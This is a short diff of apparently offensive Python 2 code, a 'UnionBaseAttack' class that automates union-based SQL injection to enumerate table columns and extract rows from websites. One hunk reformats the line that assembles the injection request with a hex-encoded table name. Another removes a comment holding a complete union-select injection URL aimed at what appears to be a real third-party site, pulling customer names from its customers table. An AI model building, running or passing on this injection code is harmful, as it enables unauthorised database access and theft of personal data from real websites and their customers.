@@ -165,7 +165,8 @@ class UnionBaseAttack(object):
                 while True:
                     response = reqs.get(str(string.replace(tuple_var[1],
                             tuple_var[0][0], define_get_columns_of_table_convert_query_php[query_ex_table_counter])
-                            + define_end_string_columns_of_table_query_php[query_ex_table_counter] + "0x" + selected_table.encode('hex') 
+                            + define_end_string_columns_of_table_query_php[query_ex_table_counter] + "0x" +
+                                            selected_table.encode('hex')
                             + " limit %d, 1" % (limit_counter) + "%23"), headers=define_headerdata, verify=False)
                     
                     if response.content.find("'2134115356'") is not -1:
@@ -190,8 +191,6 @@ class UnionBaseAttack(object):
                     make_table.add_row([str(counter), item])
                     counter = counter + 1
                 print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"
-
-                #http://www.jazzjournal.co.uk/article.php?id=-20%20Union%20Select%201,concat(QUOTE(2134115356),%20ConVert(customername+UsIng+LAtin1),%20QUOTE(62134115356)),3,%204,5,6,7,8,9,10,11,12%20from%20customers%20limit%200,1
 
                 data_extracted = list()
                 query_ex_column_counter = 0
